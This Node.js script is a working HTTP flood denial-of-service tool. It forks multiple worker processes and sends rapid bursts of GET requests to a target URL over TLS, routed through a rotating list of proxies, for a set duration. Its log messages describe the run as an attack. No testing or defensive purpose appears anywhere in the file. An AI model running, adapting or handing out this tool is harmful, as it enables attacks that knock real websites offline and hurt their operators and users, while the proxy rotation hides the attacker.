const cluster = require('cluster');
const fs = require('fs');
const tls = require('tls');
const { URL } = require('url');
const os = require('os');

if (process.argv.length < 7) {
    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const threads = parseInt(process.argv[5], 10);
const proxyFile = process.argv[6];

let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());

if (proxies.length === 0) {
    console.error("Error: Proxy file is empty or cannot be read.");
    process.exit(1);
}

if (cluster.isMaster) {
    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        console.log(`Worker ${worker.process.pid} started`);
    }

    setTimeout(() => {
        console.log("Attack completed.");
        process.exit(0);
    }, duration * 1000);

    // Log when workers exit
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
    });
} else {
    const target = new URL(targetURL);
    let proxyIndex = 0;
    const startTime = Date.now(); // Save the start time of the attack

    // Function to send a single request using TLS connection
    function sendTLSRequest(proxy) {
        const proxyParts = proxy.trim().split(":");
        if (proxyParts.length < 2) return;

        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1], 10);

        const options = {
            host: proxyHost,
            port: proxyPort,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            function flood() {
                if (Date.now() - startTime >= duration * 1000) {
                    console.log(`Worker ${process.pid} stopping attack.`);
                    process.exit(0);
                }

                // Flood request with the given rps
                for (let i = 0; i < rps; i++) {
                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                    `Host: ${target.hostname}\r\n` +
                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
                                    "Accept: */*\r\n" +
                                    "Connection: keep-alive\r\n\r\n";
                    client.write(request);
                }

                // Continue flooding without delay for high-speed request sending
                setTimeout(flood, 0); // Flooding as quickly as possible within the given rps
            }
            flood();
        });

        client.on("error", (err) => {
            console.warn(`Error with proxy ${proxy}: ${err.message}`);
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    // Main loop to handle proxy usage and flooding
    function attackLoop() {
        if (Date.now() - startTime >= duration * 1000) {
            console.log(`Worker ${process.pid} stopping attack.`);
            process.exit(0);
        }

        const proxy = proxies[proxyIndex];
        proxyIndex = (proxyIndex + 1) % proxies.length; // Round-robin proxy

        sendTLSRequest(proxy);
        setTimeout(attackLoop, 0); // Continue flooding without delay
    }

    // Add uncaught exception handler to prevent worker crashes
    process.on('uncaughtException', (err) => {
        console.error('Uncaught exception:', err);
        process.exit(1);  // Ensure worker terminates after an uncaught exception
    });

    attackLoop();
}
